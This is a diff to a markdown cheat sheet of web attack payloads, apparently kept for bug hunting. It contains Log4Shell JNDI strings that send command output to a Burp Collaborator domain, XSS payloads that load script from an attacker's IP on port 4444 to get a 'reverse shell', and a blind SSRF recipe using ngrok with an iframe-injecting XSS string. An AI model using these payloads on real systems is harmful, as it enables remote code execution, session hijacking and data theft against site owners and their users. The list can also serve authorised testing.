@@ -1,8 +1,8 @@
 ## Blind RCE:
-``
-${jndi:ldap://${command}XXXX${::-.}burpcollab.net}zzzz
+```
+${jndi:ldap://${command}XXXX${::-.}burpcollab}zzzz
 
-${jndi:ldap://${command}XXXX${::-.}.burpcollaborator.net}zzzz
+${jndi:ldap://${command}XXXX${::-.}.burpcollaborator}zzzz
 ```
 ## XSS to Reverse shell:
 ```
@@ -13,6 +13,11 @@ ${jndi:ldap://${command}XXXX${::-.}.burpcollaborator.net}zzzz
 <img src=link onerror=setInterval(function(){{with(document)body.appendChild(createElement("script")).src="//IP:4444"}},1010)>
 
 <body onload=setInterval(function(){{with(document)body.appendChild(createElement("script")).src="//IP:4444"}}></body>
-
-<img src=x onerror=document.write(navigator.appVersion)>
+```
+## Blind SSRF:
+```
+1. Run ngrok: ./ngrok http 80
+2. Open with Browser: 127.0.01:4040/inspect/http
+3. Inject the payload in below:
+"><img src="xasdasdasd" onerror="document.write('<iframe src=https://d0.ngrok.io></iframe>')"
 ```
